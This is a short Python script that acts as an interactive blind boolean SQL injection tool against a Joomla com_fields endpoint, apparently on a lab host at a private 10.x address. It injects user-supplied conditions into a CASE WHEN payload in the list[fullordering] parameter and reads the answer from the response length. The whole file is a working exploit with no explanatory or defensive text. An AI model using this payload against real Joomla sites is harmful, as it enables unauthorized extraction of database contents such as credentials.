#!/usr/bin/env python3
import requests
import string
import urllib
import sys

def getConcat(st):
    output = "CONCAT("
    for ch in st:
        output += f"CHAR({ord(ch)}),"
    output = output[:-1] + ")"
    return output




def test(st):
    orig = "http://10.10.215.138/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE%20WHEN%20(TEST)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)"
    r = requests.get(orig.replace("TEST", st))
    l = len(r.text)
    if l > 3530:
        return True
    else:
        return False

import readline

while True:
    inp = input("> ")
    character = inp[-1]
    inp = inp[:-1]
    inp += f"char({ord(character)})"
    
    print(inp, test(inp))



